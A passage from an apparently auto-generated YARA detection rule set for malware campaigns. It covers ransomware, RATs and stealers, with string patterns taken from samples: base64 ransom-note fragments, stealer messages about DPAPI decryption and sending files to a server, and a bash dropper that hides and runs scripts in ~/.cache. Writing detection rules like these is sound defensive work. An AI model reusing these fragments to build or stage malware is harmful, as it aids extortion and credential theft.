        $s11 = "tb3N0IGNhc2VzLCB3ZSBmaW5kIHRoaXMgaW5mb3JtYXRpb24gYW5kIGRvd25sb2FkIGl0Lg0KDQotLS0tLT4gSWYgeW91IGRvIG5" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4412416 and 12 of them
}

rule Sightlines_tlsh_951da108_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-951da108"
        date = "2026-10-21"
        campaign = "tlsh-951da108"
        family = ""
        hash = "0120990444ff05bbbe7d31f874319b23d43e2376052840e7f42696c69638206c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-951da108.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ngs.rsfn5+fiBJTkMgUmFuc29tIH5+fn4KCi0tLS0tPiBZb3VyIGRhdGEgaXMgc3RvbGVuIGFuZCBlbmNyeXB0ZWQuCklmIHlvdS" ascii
        $s1 = "BhdHRhY2tzLiAKCi0tLS0tPiBEb24ndCBnbyB0byByZWNvdmVyeSBjb21wYW5pZXMhClRoZXkgYXJlIGVzc2VudGlhbGx5IGp1c3" ascii
        $s2 = "BheWthYmpxYzJtdGR4cTZjMjNucWg0eDZtNWRrcHM1ZnI2dmdka2d6cDVuanNzeDZxa2lkLm9uaW9uLwoKWW91ciBwZXJzb25hbC" ascii
        $s3 = "BJRDoKCSVpZCUKCi0tLS0tPiBXYXJuaW5nISBEb24ndCBkZWxldGUgb3IgbW9kaWZ5IGVuY3J5cHRlZCBmaWxlcywgaXQgd2lsbC" ascii
        $s4 = "IgaHR0cHM6Ly90d2l0dGVyLmNvbS9oYXNodGFnL2luY3JhbnNvbT9mPWxpdmUKCi0tLS0tPiBZb3UgbmVlZCB0byBjb250YWN0IH" ascii
        $s5 = "9hZC5vbmlvbi8KCkxpbmsgZm9yIG5vcm1hbCBicm93c2VyOgoJaHR0cDovL2luY2Jsb2cuc3UvCgkKLS0tLS0+IFdoYXQgZ3Vhcm" ascii
        $s6 = "BheSB0aGUgc2FsYXJpZXMgb2YgeW91ciBzeXN0ZW0gYWRtaW5pc3RyYXRvcnMuIEdldCBvdmVyIGl0IGFuZCBwYXkgZm9yIGl0Lg" ascii
        $s7 = "BjYXNlcyB3aGVyZSByZWNvdmVyeSBjb21wYW5pZXMgdGVsbCB5b3UgdGhhdCB0aGUgcmFuc29tIHByaWNlIGlzICQ1TSBkb2xsYX" ascii
        $s8 = "JzLCBidXQgaW4gZmFjdCB0aGV5IHNlY3JldGx5IG5lZ290aWF0ZSB3aXRoIHVzIGZvciAkMU0uCklmIHlvdSBhcHByb2FjaGVkIH" ascii
        $s9 = "Jyb3dzZXIgTGluazoKCWh0dHA6Ly9pbmNibG9nNnF1NHk0bW00enZ3NW5ybXVlNnFid3RnanN4cHc2YjdpeHpzc3UzNnRzYWpsZG" ascii
        $s10 = "lvdSB3aWxsIHF1aWNrbHkgcmVzdG9yZSB5b3VyIHN5c3RlbXMgYW5kIG1ha2UgZXZlbiBtb3JlIG1vbmV5LgpUcmVhdCB0aGlzIH" ascii
        $s11 = "RlbnMgb2YgY29tcGFuaWVzIGFyb3VuZCB0aGUgd29ybGQuCgpUb3IgQnJvd3NlciBMaW5rIGZvciBjaGF0OgoJaHR0cDovL2luY3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2249456 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_c37488c8_sheetrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-c37488c8"
        date = "2026-10-21"
        campaign = "dotnet_typelib_guid-c37488c8"
        family = "sheetrat"
        hash = "52e1f2b256e2b9d6547883f885c67fdc55f62dda866b5fc245d4c700352f20de"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-c37488c8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "CABAFE20CFEA6C92D3377C14650461E190857D48D13934B5562233C314AAFBB5" ascii
        $s4 = "0C50C67E839472CD612D6033109F5E032987E48E367247F29C0EB30A1D3EB5FC" ascii
        $s5 = "42FC44596E89DA5AE6D4D3E3F99803B92713C413F3B56B0F59C5CC4E681E362C" ascii
        $s6 = "E123F60E9FC6E974D1381F2F15FB19E7960628CC8925D65E344C2F2BDC64F424" ascii
        $s7 = "$4a2f8fb6-1077-469a-9246-736e6afe8da1" ascii
        $s8 = "ProcessClientBufferNotReceived1" ascii
        $s9 = "ProcessClientBufferReceived1" ascii
        $s10 = "ProcessClientBufferReceived2" ascii
        $s11 = "CaptureResizeReduceQuality" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d723ca3c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d723ca3c"
        date = "2026-10-21"
        campaign = "tlsh-d723ca3c"
        family = ""
        hash = "36ea1095d1be5b0c95ad214745f8622b6eba26d1f944bab8641431c61f11dba0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d723ca3c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER$ByReference.classPK" ascii
        $s1 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_SERIALIZED_INFO$ByReference.classPK" ascii
        $s2 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE$ByReference.c" ascii
        $s3 = "com/sun/jna/platform/win32/Winevt$EVT_CHANNEL_CONFIG_PROPERTY_ID.classPK" ascii
        $s4 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_PARA$DUMMYUNION.classPK" ascii
        $s5 = "com/sun/jna/platform/win32/Winevt$EVT_SUBSCRIBE_NOTIFY_ACTION.classPK" ascii
        $s6 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE.classPK" ascii
        $s7 = "com/sun/jna/platform/win32/WinCrypt$CERT_CHAIN_POLICY_STATUS$ByReference.classPK" ascii
        $s8 = "com/sun/jna/platform/win32/Winsvc$SERVICE_FAILURE_ACTIONS$ByReference.classPK" ascii
        $s9 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER.classPK" ascii
        $s10 = "com/sun/jna/platform/win32/COM/Wbemcli$WBEM_CONDITION_FLAG_TYPE.classPK" ascii
        $s11 = "com/sun/jna/platform/win32/Winevt$EVT_PUBLISHER_METADATA_PROPERTY_ID.classPK" ascii
    condition:
        filesize < 13260288 and 12 of them
}

rule Sightlines_mutex_901029f8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign mutex-901029f8"
        date = "2026-10-23"
        campaign = "mutex-901029f8"
        family = ""
        hash = "17bf039a9a73ecb31518e497cf516bdb7fa2468e156d352712cb928eb3e33fa1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/mutex-901029f8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">" ascii
        $s1 = "KmuX}}O|zmvk|}\\az|impvwQxw}u|k" ascii
        $s2 = "STEP after HomeCast NULL" ascii
        $s3 = "STEP before Invoke_3" ascii
        $s4 = "STEP after Invoke_3" ascii
        $s5 = "D$XH9D$xsIHcD$0H9D$xs=H" ascii
        $s6 = "STEP after VeilCast" ascii
        $s7 = "STEP before FaceArm" ascii
        $s8 = "CertOpenSystemStoreW" ascii
        $s9 = "fKq]LjUYKsZoY_HUSR" ascii
        $s10 = "STEP after FaceArm" ascii
        $s11 = "Custom Gradient" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 31400960 and 12 of them
}

rule Sightlines_tlsh_4bbbd18e_valleyrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4bbbd18e"
        date = "2026-10-18"
        campaign = "tlsh-4bbbd18e"
        family = "valleyrat"
        hash = "30db42655bcacbda1562247e429059f446d96719d8145fd467447dd8625b98bb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4bbbd18e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "5Digital ID Class 3 - Microsoft Software Validation v21,0*" ascii
        $s1 = "#Take-Two Interactive Software, Inc.0" ascii
        $s2 = "#Take-Two Interactive Software, Inc.1" ascii
        $s3 = "a formatting trait implementation returned an error when the underlying stream did notError" ascii
        $s4 = "Rockstar Games1>0<" ascii
        $s5 = "NtDelayExecution" ascii
        $s6 = "L$,D3D$,D3D$,D3D$,A1" ascii
        $s7 = "{9DSLPnAmIDPw_" ascii
        $s8 = "lBW8uP$Q9HPj1" ascii
        $s9 = "uPjpHll9qeBQ7" ascii
        $s10 = "l$q6QjB81]*1B" ascii
        $s11 = ")14:EFIJNOde" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17396544 and 11 of them
}

rule Sightlines_tlsh_a6149b59_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a6149b59"
        date = "2026-10-20"
        campaign = "tlsh-a6149b59"
        family = ""
        hash = "77283baa36cee15b9d4d5f9ae252fc2bbd2e0e7ff3dae0994786ecb338c6f81d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a6149b59.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK$ENTITY.classPK" ascii
        $s1 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK$BLOCK.classPK" ascii
        $s2 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK$AIR.classPK" ascii
        $s3 = "com/github/noamm9/features/impl/dev/FEAT_WebSocket$init$6$1.classPK" ascii
        $s4 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK$ENTITY.classPK" ascii
        $s5 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK$BLOCK.classPK" ascii
        $s6 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK$AIR.classPK" ascii
        $s7 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK.classPK" ascii
        $s8 = "com/github/noamm9/features/impl/floor7/LeapCounter$REGION$updateCounter$1.classPK" ascii
        $s9 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK.classPK" ascii
        $s10 = "com/github/noamm9/features/impl/floor7/LeapCounter$REGION.classPK" ascii
        $s11 = "com/github/noamm9/features/impl/dungeon/solvers/puzzles/WaterBoardSolver$LEVER$Companion.classPK" ascii
    condition:
        filesize < 27263666 and 12 of them
}

rule Sightlines_imphash_8094c7bf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8094c7bf"
        date = "2026-10-20"
        campaign = "imphash-8094c7bf"
        family = ""
        hash = "0059a3866d1902467dd4fe64108aefd5c7fd2856a794a251c2b28004a92257b9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8094c7bf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s1 = "random_device::random_device(const std::string&): unsupported token" ascii
        $s2 = "random_device::random_device(const std::string&): device not available" ascii
        $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s4 = "basic_string::_S_construct null not valid" ascii
        $s5 = "std::basic_string<char, std::char_traits<char>, std::allocator<char> >" ascii
        $s6 = "basic_string: construction from null is not valid" ascii
        $s7 = "only http:// urls are supported for downloads" ascii
        $s8 = "std::basic_iostream<char, std::char_traits<char> >" ascii
        $s9 = "std::basic_ostream<char, std::char_traits<char> >" ascii
        $s10 = "only http:// urls are supported for the geo lookup" ascii
        $s11 = "the network helper is missing required exports" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fb715736_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fb715736"
        date = "2026-10-20"
        campaign = "tlsh-fb715736"
        family = ""
        hash = "04f32dd4e681959fb26a3d11aa58874680d1a867b2ca5770670c2fdf91736a04"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fb715736.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/odtheking/odin/features/impl/skyblock/QuiverDisplay$quiverHud$2.classPK" ascii
        $s1 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$STARTS_WITH.classPK" ascii
        $s2 = "com/odtheking/odin/features/impl/boss/WitherDragonsEnumKt$handleSpawnPacket$2$1.classPK" ascii
        $s3 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$NUMBERS.classPK" ascii
        $s4 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$overflowManaHud$2.classPK" ascii
        $s5 = "com/odtheking/odin/utils/network/WebUtils$sam$java_util_function_BiConsumer$0.classPK" ascii
        $s6 = "com/odtheking/odin/features/impl/boss/termGUI/MelodyGui$buildTerminal$1$1.classPK" ascii
        $s7 = "com/odtheking/odin/features/impl/skyblock/ChatCommands$partyAllInvite$2.classPK" ascii
        $s8 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$hideOverflow$2.classPK" ascii
        $s9 = "com/odtheking/odin/features/impl/dungeon/InvincibilityTimer$equippedMaskColor$2.classPK" ascii
        $s10 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$hideZeroSF$2.classPK" ascii
        $s11 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$MELODY.classPK" ascii
    condition:
        filesize < 7770436 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_68c1cd29_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-68c1cd29"
        date = "2026-10-20"
        campaign = "dotnet_typelib_guid-68c1cd29"
        family = ""
        hash = "0e3020607aec6a3d096692f24f1e390c44073f6b0e31c3260f21beced5e9bcce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-68c1cd29.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "select sum(SoLuong) from ChiTietHD where MaCTHD = '" wide
        $s1 = "select count(*) from KhachHang where SoDienThoai = '" wide
        $s2 = "select count(*) from TaiKhoan where MANV is null and TenTK = '" wide
        $s3 = "select * from KhachHang where SoDienThoai like '%'+'" wide
        $s4 = "select * from KhachHang where HoTen like N'%'+'" wide
        $s5 = "select count(*) from HoaDon where ThoiGian is not null and MaHD = '" wide
        $s6 = "select HoTen FROM KhachHang where SoDienThoai = '" wide
        $s7 = "select * from KhachHang where GioiTinh = N'" wide
        $s8 = "select MANV from TaiKhoan where TenTK ='" wide
        $s9 = "select LinkHinh from SanPham where MaSP = '" wide
        $s10 = "select DiaChi from KhachHang where SoDienThoai = '" wide
        $s11 = "select count(*) from HoaDon where MaHD = '" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2701312 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_8165a7e1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-8165a7e1"
        date = "2026-10-20"
        campaign = "dotnet_typelib_guid-8165a7e1"
        family = ""
        hash = "9db92c127123dcc94f94e84e8745faa84420f8235069478f7081dce39f4452c3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-8165a7e1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "DILUVIUM! Flumen inundat cavernam (Flood pulse cleans sediment & fills channels)." wide
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "RUINA! Eventus collapsus factus est! (A collapse event occurred!)" wide
        $s5 = "Configuratio servata est! (Configuration saved successfully)" wide
        $s6 = "Raining! Aqua crescit in siphone (Rain level rises in the sump)." wide
        $s7 = "Calcit Saturation must be between 0 and 100!" wide
        $s8 = "C290034A97A61A2F8BE41E55B594BC89F452E69C81BDAAFD00ADEF95BB51419A" ascii
        $s9 = "CD1BA97F43CC8DC3152172D7F2EA7B953ADE66EE8713FFA8E1DEEFC30CCCC45B" ascii
        $s10 = "24C80B0C1D0F8977AA8C6ED3633A88E27663B9FBFFACF2EEE8A488EB3A86FE14" ascii
        $s11 = "CaveSystem.Properties.Resources.resources" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2165760 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_0d40ebc9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-0d40ebc9"
        date = "2026-10-20"
        campaign = "dotnet_typelib_guid-0d40ebc9"
        family = ""
        hash = "06c56f65089f4ba588265fa1f56cbccbfe5e9a450160d13d8b3a575a4faf07fe"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-0d40ebc9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<ViikkoSimulaatioData xmlns=\"http://tempuri.org/KellokoneistoSchema.xsd\">" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "Kertynyt Virhe (Cumulative Error): {0:+0.0;-0.0;0.0} s" wide
        $s4 = "Kertynyt Virhe (Cumulative Error): +12.4 s" wide
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "yntivakaus (Rate Stability): {0:+0.0;-0.0;0.0} s/day" wide
        $s7 = "  <LampotilaKeskiarvo>{0:F1}</LampotilaKeskiarvo>" wide
        $s8 = "Status: Ticking | Escapement: Deadbeat | L: 1.0m" wide
        $s9 = "<PainoKorkeusMaksimisuhta>k__BackingField" ascii
        $s10 = "<VirheHistoriaSecPerDay>k__BackingField" ascii
        $s11 = "  <KertynytVirheSekuntia>{0:F2}</KertynytVirheSekuntia>" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 3564544 and 10 of them
}

rule Sightlines_tlsh_e3e245a5_blakcseestealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e3e245a5"
        date = "2026-10-20"
        campaign = "tlsh-e3e245a5"
        family = "blakcseestealer"
        hash = "554fb593a7e086360b68f90dfcee8aef9bd9a25659dedae188a85bd756b3ea87"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e3e245a5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Func_impl_no_alloc@V<lambda_68e3b65500009b224cfd4b39ddd88c46>@@XAEBV?$basic_string@DU?$char_t" ascii
        $s1 = ".?AV?$_Func_impl_no_alloc@V<lambda_2bd2efc0f489c80c64f6c76a3f06661d>@@XAEBV?$basic_string@DU?$char_t" ascii
        $s2 = "GetElevationKey: FINAL RESULT - COM decryption failed (empty result)" ascii
        $s3 = "Payload DLL: CLSIDFromString failed, hr=0x%08X, clsid=%s" ascii
        $s4 = "Payload DLL: CoCreateInstance(Edge) failed, hr=0x%08X, err=%lu" ascii
        $s5 = "(match_len >= TDEFL_MIN_MATCH_LEN) && (match_dist >= 1) && (match_dist <= TDEFL_LZ_DICT_SIZE)" wide
        $s6 = "Payload DLL: DecryptData FAILED, hr=0x%08X, COM_lastErr=%lu, GetLastErr=%lu" ascii
        $s7 = "Payload DLL: IIDFromString failed, hr=0x%08X, iid=%s" ascii
        $s8 = "DecryptDPAPI: CryptUnprotectData FAILED, error=0x%08X (%lu)" ascii
        $s9 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide
        $s10 = "CallCOMDecryptData: Bootstrap TIMEOUT or FAILED, result=%d" ascii
        $s11 = "SendFileToServer: shutdown(SD_SEND), waiting for response..." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1811456 and 9 of them
}

rule Sightlines_imphash_7fa38c68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7fa38c68"
        date = "2026-10-20"
        campaign = "imphash-7fa38c68"
        family = ""
        hash = "4fc04b64ff9fe77be60ebf30dec9bf876ccc5eff4e344f8f23cddaeeb4485957"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7fa38c68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{35138b9a-5d96" ascii
        $s1 = "ortedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s3 = "ndentAssembly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedP" ascii
        $s4 = "m.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Null" ascii
        $s5 = "-4fbd-8e2d-a2440225f93a}\"/></application></compatibility></assembly>" ascii
        $s6 = "ependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\"" ascii
        $s7 = "ity></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supp" ascii
        $s8 = "RMDir: RemoveDirectory invalid input(\"%s\")" wide
        $s9 = "File: overwriteflag=%d, allowskipfilesflag=%d, name=\"%s\"" wide
        $s10 = "rivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></secur" ascii
        $s11 = "ExecShell: warning: error (\"%s\": file:\"%s\" params:\"%s\")=%d" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2696016 and 12 of them
}

rule Sightlines_rich_header_hash_0fc4db97_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-0fc4db97"
        date = "2026-10-24"
        campaign = "rich_header_hash-0fc4db97"
        family = ""
        hash = "1bc82bed6143d2bf1b6b08a7809f4a5e29317d6fddd338a7da3c0223522e4bbf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-0fc4db97.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "10.0.26100.1742 (WinBuild.160101.0800)" wide
        $s1 = "ApiSet Stub DLL" wide
        $s2 = "apisetstub" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_c35ad77d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c35ad77d"
        date = "2026-10-20"
        campaign = "tlsh-c35ad77d"
        family = ""
        hash = "151355d4e162afc65c8f9569e78c02fa071d84041cc0253cfaf98ad5a9e96435"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c35ad77d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "E1A678858AB902D9F4DEF13F7E8C143A9684615D6703C9BB0BF12849254D0913" ascii
        $s4 = "088D193B482A02DC449974A6C9FF150261F9BBAFDA69849E8D98C2D8AC9EF439" ascii
        $s5 = "FA9A7F0BA17A7817533D88BA29C5C119B75A8FD05256EB52C8B76903BB18BE29" ascii
        $s6 = "99952978970AE43F4FAECAA9B132E74A0965981E8BE3153AEDE46611E5905766" ascii
        $s7 = "A59EBB7040529DA1C25434845C93C6CB3B58AF645992F9C541A526B8902092BD" ascii
        $s8 = "<ComputeRoomAcousticsMetrics>b__1_0" ascii
        $s9 = "54 68 69 73 20 69 73 20 6E 6F 72 6D 61 6C" wide
        $s10 = "get_icons8_purchase_order_50" ascii
        $s11 = "get_icons8_graph_report_501" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1671168 and 12 of them
}

rule Sightlines_tlsh_c7e60cfb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c7e60cfb"
        date = "2026-10-20"
        campaign = "tlsh-c7e60cfb"
        family = ""
        hash = "e81352990490771d7ead9e1e6efe47e16cab5947cf0b265df8844d7eba827062"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c7e60cfb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2081792 and 4 of them
}

rule Sightlines_imphash_a401ad4f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a401ad4f"
        date = "2026-10-20"
        campaign = "imphash-a401ad4f"
        family = ""
        hash = "188a79e5b0aeb2656c15fc167bac923b94752b98996f1981e95c173729ce7a0f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a401ad4f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "%sone%08X.tmp" ascii
        $s1 = "lstrcpyA" ascii
        $s2 = "ARIESONE" ascii
        $s3 = "lstrcatA" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 4 of them
}

rule Sightlines_host_6933c2fb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-6933c2fb"
        date = "2026-10-20"
        campaign = "host-6933c2fb"
        family = ""
        hash = "05cebfa73485dadf802c473571183eda70aecd9766136c7c1af666987bcb6461"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-6933c2fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "nohup bash \"$TARGET_DIR/tokenlinux.sh\" > /dev/null 2>&1 &" ascii
        $s1 = "mv \"$TARGET_DIR/end_activator\" \"$TARGET_DIR/end.sh\"" ascii
        $s2 = "chmod +x \"$TARGET_DIR/start.sh\" \"$TARGET_DIR/end.sh\"" ascii
        $s3 = "mv \"$TARGET_DIR/start_activator\" \"$TARGET_DIR/start.sh\"" ascii
        $s4 = "chmod +x \"$TARGET_DIR/tokenlinux.sh\"" ascii
        $s5 = "bash \"$TARGET_DIR/start.sh\"" ascii
        $s6 = "TARGET_DIR=\"$HOME/.cache\"" ascii
        $s7 = "echo \"Authenticated\"" ascii
        $s8 = "#!/bin/bash" ascii
        $s9 = "  exit 1" ascii
    condition:
        filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_2e1fc9ff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2e1fc9ff"
        date = "2026-10-18"
        campaign = "tlsh-2e1fc9ff"
        family = ""
        hash = "6d2de1fb1a561c2e19e4a91894cb6bee1bc045ecff9d20eaf48488500bf577d8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2e1fc9ff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "C3$24C5$26C7$28C9$!" ascii
        $s3 = "Ka7TaggtiTGXlllS" ascii
        $s4 = "J#Paok1EPum$U/" ascii
        $s5 = "h fil]or.Xir`" ascii
        $s6 = "-TCjX flSYAK" ascii
        $s7 = "mgRTFSuBPX[\\" ascii
        $s8 = "_;mulkxYcp-Y" ascii
        $s9 = "BwiAeUQ2o[}" ascii
        $s10 = "TAL: kerm4l" ascii
        $s11 = "?rGKkmeo0B" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_417d2328_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-417d2328"
        date = "2026-10-18"
        campaign = "tlsh-417d2328"
        family = ""
        hash = "1fac02a405615d392e3ca0b0e706f3f27c5b64dcc1e690d175c37fe0f71742b3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-417d2328.json"
